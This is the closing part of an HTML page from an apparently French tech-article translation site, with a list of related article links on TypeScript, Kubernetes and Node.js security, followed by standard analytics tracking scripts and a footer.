<li><a href="../fr493704/index.html">Utiliser TypeScript en JavaScript sans √©crire TypeScript</a></li>
<li><a href="../fr493708/index.html">Anatomie de ma grappe Kubernetes maison</a></li>
<li><a href="../fr493712/index.html">Nouvelles fonctionnalit√©s TypeScript pour une convivialit√© am√©lior√©e</a></li>
<li><a href="../fr493714/index.html">Fiches de s√©curit√©: Nodejs</a></li>
<li><a href="../fr493716/index.html">Inf√©rence de type avec TypeScript en utilisant la construction as const et le mot cl√© infer</a></li>
<li><a href="../fr493718/index.html">Discussion: utilitaires UNIX standard que peu ont utilis√©s et utilisent actuellement</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>